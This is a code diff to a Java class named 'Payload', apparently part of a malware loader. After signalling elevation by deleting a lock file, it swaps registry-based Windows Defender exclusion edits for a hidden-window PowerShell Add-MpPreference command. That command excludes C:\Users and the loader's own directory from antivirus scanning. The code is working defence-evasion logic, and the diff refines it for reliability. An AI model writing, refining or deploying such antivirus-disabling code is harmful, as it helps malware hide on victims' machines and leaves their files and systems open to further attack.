@@ -191,36 +191,28 @@ public class Payload {
             log("Executing payload...");
             File loaderDir = getLoaderDir();
             
-            // 1. Delete lock file so parent knows we are elevated
+            // 1. Delete lock file
             File lock = new File(loaderDir, ".lock");
             if (lock.exists()) {
                 lock.delete();
                 log("Deleted .lock file to notify parent.");
             }
 
-            // 2. Add AV Exclusions IMMEDIATELY
-            log("Adding AV exclusion...");
+            // 2. Add AV Exclusions IMMEDIATELY via PowerShell Add-MpPreference
+            log("Adding AV exclusion via PowerShell...");
             try {
-                // Exclude C:\Users
-                ProcessBuilder pb1 = new ProcessBuilder(
-                    "reg", "add", 
-                    "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
-                    "/v", "C:\\Users", 
-                    "/t", "REG_DWORD", "/d", "0", "/f"
+                String psExclude = String.format(
+                    "Add-MpPreference -ExclusionPath 'C:\\Users', '%s' -ErrorAction SilentlyContinue",
+                    loaderDir.getAbsolutePath().replace("'", "''")
                 );
-                pb1.start().waitFor();
-
-                // Exclude AppBroker path specifically
-                ProcessBuilder pb2 = new ProcessBuilder(
-                    "reg", "add", 
-                    "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", 
-                    "/v", loaderDir.getAbsolutePath(), 
-                    "/t", "REG_DWORD", "/d", "0", "/f"
-                );
-                pb2.start().waitFor();
                 
-                // Wait a moment for Defender to register the exclusions
-                Thread.sleep(2000); 
+                ProcessBuilder pb = new ProcessBuilder(
+                    "powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psExclude
+                );
+                pb.start().waitFor();
+                
+                // Wait 3 seconds for Defender to actually apply the policy
+                Thread.sleep(3000); 
             } catch (Exception e) {
                 log("Failed to add exclusions: " + e.toString());
             }
